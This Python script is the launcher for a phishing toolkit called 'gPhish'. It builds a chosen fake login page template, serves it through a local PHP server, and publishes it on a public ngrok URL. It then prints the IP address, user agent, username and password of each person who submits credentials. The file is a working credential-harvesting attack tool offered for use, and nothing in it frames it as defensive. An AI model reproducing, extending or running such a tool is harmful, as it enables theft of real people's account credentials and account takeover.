import os, subprocess, sys, shutil, unicodedata, json, dotenv
from termcolor import colored
from art import text2art
from logger import Log
from time import sleep
from pyngrok import ngrok
from InquirerPy import inquirer # Docs: https://github.com/kazhala/InquirerPy/wiki
from terminaltables import SingleTable

## Load environment variables for gPhish
dotenv.load_dotenv()

## Globals
template_path = ""

def normal_exit():
    os.system('clear')
    print('''\n"And then he turned himself info a pickle"\n"Funiest shit I've ever seen"''')
    print(colored('\ngPhish by LennyFaze\n', 'blue'))
    exit()

def banner(clear=True):
    ## Clear console
    if clear:
        os.system('clear')
    print(colored(text2art('gPhish', font="smpoison"), 'green'))
    print('By LennyFaze                                v0.2')
    print('Press Ctrl + C to exit\n')

def main_menu():
    global template_path
    try:
        ## Show banner
        banner()

        ## Create env if it doesn't exist yet
        if not os.path.isfile('.env'):
            Log.info('No .env detected creating new one...')

            # using my own env creator function :p
            configure_env()

            Log.success('Finished setting up .env')
            sleep(2)
            dotenv.load_dotenv()
            main_menu()

        ## Create logs directory if it doesn't exist yet
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        ## Make user pick category
        category = inquirer.select(
            message='Select a category:', 
            choices=os.listdir('templates/')).execute()

        ## Make user pick template in category
        template = inquirer.select(
            message='Select a template:', 
            choices=os.listdir('templates/' + category + '/')).execute()

        ## Define template path for server process
        template_path = 'templates/' + category + '/' + template
        
        if not os.path.isdir(f"{template_path}/dist") and os.path.isdir(f"{template_path}/node_modules"):
            ## Build template if not build yet
            Log.info('Template not build yet, starting setup.')
            setup_template()
        if not os.path.isdir(f"{template_path}/dist") and not os.path.isdir(f"{template_path}/node_modules"):
            ## Build template if not installed yet
            Log.info('Template not installed yet, starting setup.')
            setup_template()
        elif os.path.isfile(f"{template_path}/package.json") and os.path.isdir(f"{template_path}/node_modules"):
            ## Promt user if the template should be rebuild
            rebuild = inquirer.confirm('Rebuild template?', default=False).execute()
            if rebuild:
                setup_template()

        ## Start server if template is already built
        start_server()
    except KeyboardInterrupt:
        ## Handle Ctrl + C
        normal_exit()

def configure_env(path='.'):
    lines = []

    with open(f"{path}/.env.example", 'r') as input_file:
        lines = input_file.readlines()

    for line in lines:
        if(line.startswith('!')):
            value = inquirer.text(
                message=f"Set {line[line.find('!')+1 : line.find('=')]}:", 
                default=line[line.find('#(')+3 : line.find(')#')-1]).execute()
            if len(value) > 1:
                lines[lines.index(line)] = line[line.find('!')+1 : line.find('=')] + "='" + value + "'"
            else:
                lines[lines.index(line)] = line[line.find('!')+1 : line.find('=')] + "=" + line[line.find('#(')+2 : line.find(')#')]

    ## Delete old .env file if exist
    if os.path.exists(f"{path}/.env"):
        os.remove(f"{path}/.env")

    ## Create new .env file
    with open(f"{path}/.env", 'w') as output_file:
        for line in lines:
            output_file.write(line + '\n')

def setup_template():
    ## Check for first time setup
    if os.path.isfile(f"{template_path}/package.json") and not os.path.isdir(f"{template_path}/node_modules"):
        ## Promt user if the template should be installed
        install = inquirer.confirm('Do you want to install and continue?', default=True).execute()
        if install:
            Log.info('Building template, please wait...')
            builder = subprocess.Popen(f"cd {template_path} && {os.getenv('INSTALL_COMMAND')}", shell=True)

            ## Wait until builder is finished
            try:
                builder.wait()
            except KeyboardInterrupt:
                Log.error('Canceled installation :(')
                sleep(2)
                main_menu()

            Log.info('Template installed, continuing to setup...')
        else:
            main_menu()

    ## Promt user to configure .env file if .env.example exists
    if os.path.isfile(f"{template_path}/.env.example"):
        configure_env(template_path)


    Log.info('Building template, please wait...')
    builder = subprocess.Popen(f"cd {template_path} && {os.getenv('BUILD_COMMAND')}", shell=True)

    ## Wait until builder is finished
    try:
        builder.wait()
    except KeyboardInterrupt:
        normal_exit()
    
    Log.success('Building finished')
    start_server()

def start_server():
    ## Start server
    Log.info('Copying files to server...')

    # Delete old template if not deleted yet
    if os.path.isdir('.server/public/'):
        shutil.rmtree('.server/public/')

    # Copy selected template to server
    shutil.copytree(template_path + '/dist', '.server/public/')

    Log.info('Staring server...')
    server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t .server/public .server/php/router.php", 
        stdout=subprocess.PIPE, #open('logs/serverlog.txt', 'w'), 
        stderr=open('logs/serverlog.txt', 'w'),
        shell=True,
        universal_newlines=True
        )
    Log.success('Server running.')

    Log.info('Creating ngrok tunnel...')
    ngrok.connect(8080)
    Log.success('Ngrok tunnel opened.')

    table_data = []
    table_data.append(['Local URL', colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')])
    table_data.append(['Public URL', colored(ngrok.get_tunnels()[0].public_url, 'cyan')])
    banner_table = SingleTable(table_data)
    banner_table.inner_heading_row_border = False
    banner_table.title = '[ Server ]'
    
    ## Let server run until user stops it
    try:
        os.system('clear')
        banner()
        print(banner_table.table)
        # print(f"    Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
        # print(f"    Public URL: {colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")

        print("\nSERVEROUTPUT: \n")
        logfile = open('logs/serverlog.txt', 'w')

        for line in server.stdout:
            message = json.loads(line.split("[DataHandler]: ",1)[1])
            if message['tag'] == 'visitor':
                sys.stdout.write(colored('New visitor:', 'green') + '\n')
                sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
                sys.stdout.write('\tUseragent: \t' + colored(message['useragent'], 'blue') + '\n\n')
            if message['tag'] == 'login':
                sys.stdout.write(colored('Login:', 'green') + '\n')
                sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
                sys.stdout.write('\tUsername: \t' + colored(message['user'], 'blue') + '\n')
                sys.stdout.write('\tPassword: \t' + colored(message['pass'], 'blue') + '\n\n')
            logfile.write(line)

        server.wait()
    except KeyboardInterrupt:
        os.system('clear')
        Log.info('Ctrl + C pressed, Killing server...')
        server.kill()
        shutil.rmtree('.server/public/')
        Log.success('Server killed')
        Log.info('Killing ngrok...')
        ngrok.kill()
        Log.success('Ngrok killed')
        sleep(2)
        normal_exit()
    # except:
    #    Log.error('An unknown error occured')

## Start main menu
main_menu()